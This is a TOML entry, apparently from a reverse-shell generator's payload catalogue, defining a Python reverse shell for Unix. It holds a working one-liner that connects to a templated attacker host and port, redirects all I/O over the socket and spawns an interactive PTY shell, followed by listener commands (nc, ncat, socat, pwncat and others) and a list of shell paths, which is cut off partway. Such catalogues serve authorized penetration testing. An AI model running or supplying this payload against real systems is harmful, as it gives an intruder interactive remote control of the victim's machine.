id = "python_1"
name = "Python #1"
os = "unix"
type = "reverse"
proto = "tcp"
lang = "python"
description = "Python-based reverse shell that connects to the specified host and port, redirects IO through the socket, and spawns a fully interactive pseudo-terminal (PTY) for proper TTY support."

payload = "export RHOST=\"{{LHOST}}\";export RPORT={{LPORT}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{{SHELL}}\")'"

[listeners]
nc = "nc -lvnp {{LPORT}}"
nc_freebsd = "nc -lvn {{LPORT}}"
busybox_nc = "busybox nc -lp {{LPORT}}"
ncat = "ncat -lvnp {{LPORT}}"
ncat_exe = "ncat.exe -lvnp {{LPORT}}"
rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
rustcat = "rcat listen {{LPORT}}"
pwncat = "python3 -m pwncat -lp {{LPORT}}"
socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
powercat = "powercat -l -p {{LPORT}}"

[shells]
compatible = [
	"/usr/bin/env bash", "bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "/opt/homebrew/bin/bash", "/opt/local/bin/bash", "/snap/bin/bash", "/usr/sbin/bash", "/sbin/bash", "env bash",
	"/usr/bin/env sh", "sh", "/bin/sh", "/usr/bin/sh", "/usr/local/bin/sh", "/opt/homebrew/bin/sh", "/opt/local/bin/sh", "/snap/bin/sh", "/usr/sbin/sh", "/sbin/sh", "env sh",
	"/usr/bin/env dash", "dash", "/bin/dash", "/usr/bin/dash", "/usr/local/bin/dash", "/opt/homebrew/bin/dash", "/opt/local/bin/dash", "/snap/bin/dash", "/usr/sbin/dash", "/sbin/dash", "env dash",
	"/usr/bin/env ash", "ash", "/bin/ash", "/usr/bin/ash", "/usr/local/bin/ash", "/opt/homebrew/bin/ash", "/opt/local/bin/ash", "/snap/bin/ash", "/usr/sbin/ash", "/sbin/ash", "env ash", "busybox sh",
	"/usr/bin/env bsh", "bsh", "/bin/bsh", "/usr/bin/bsh", "/usr/local/bin/bsh", "/opt/homebrew/bin/bsh", "/opt/local/bin/bsh", "/snap/bin/bsh", "/usr/sbin/bsh", "/sbin/bsh", "env bsh",
	"/usr/bin/env csh", "csh", "/bin/csh", "/usr/bin/csh", "/usr/local/bin/csh", "/opt/homebrew/bin/csh", "/opt/local/bin/csh", "/snap/bin/csh", "/usr/sbin/csh", "/sbin/csh", "env csh",
